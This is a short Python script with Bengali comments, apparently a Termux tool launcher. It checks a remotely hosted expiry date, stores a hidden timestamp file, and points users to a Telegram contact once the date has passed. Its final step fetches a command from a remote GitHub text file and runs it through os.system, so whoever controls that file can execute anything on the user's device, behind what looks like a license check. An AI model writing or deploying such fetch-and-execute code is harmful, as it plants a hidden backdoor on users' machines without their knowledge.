import os, requests, datetime, time

# আপনার ডাটা লিঙ্ক
EXPIRY_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/expiry.txt"
COMMAND_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/cmd.txt"
CHECK_FILE = ".last_check" # গোপন ফাইল যেখানে সময় সেভ থাকবে

def get_data(url):
    try:
        return requests.get(url, timeout=10).text.strip()
    except:
        return None

def start():
    now = time.time()
    should_check_online = True

    # ১. চেক করা যে আগে কোনোবার সফলভাবে চেক হয়েছে কি না
    if os.path.exists(CHECK_FILE):
        with open(CHECK_FILE, "r") as f:
            last_time = float(f.read())
        
        # যদি শেষ চেকের পর ২৩ ঘণ্টা (৮২৮০০ সেকেন্ড) পার না হয়
        if now - last_time < 82800:
            should_check_online = False

    if should_check_online:
        print("[+] সার্ভার থেকে ডেট ভেরিফাই করা হচ্ছে...")
        expiry_data = get_data(EXPIRY_URL)
        
        if expiry_data:
            expiry_date = datetime.datetime.strptime(expiry_data, '%Y-%m-%d').date()
            if datetime.date.today() > expiry_date:
                print("\n🚫 মেয়াদ শেষ! যোগাযোগ করুন: @rifat_developer")
                os.system("termux-open-url https://t.me/rifat_developer")
                return
            
            # সফল চেকের পর বর্তমান সময় লিখে রাখা
            with open(CHECK_FILE, "w") as f:
                f.write(str(now))
        else:
            print("[-] ইন্টারনেট কানেকশন প্রয়োজন (দিনে অন্তত একবার)!")
            return
    else:
        print("[✔] অফলাইন ভেরিফাইড (পরবর্তী চেক ২৩ ঘণ্টা পর)")

    # ২. কমান্ড রান করা
    cmd = get_data(COMMAND_URL)
    if cmd:
        os.system(cmd)
    else:
        print("[-] কমান্ড লোড করা যাচ্ছে না!")

if __name__ == "__main__":
    start()
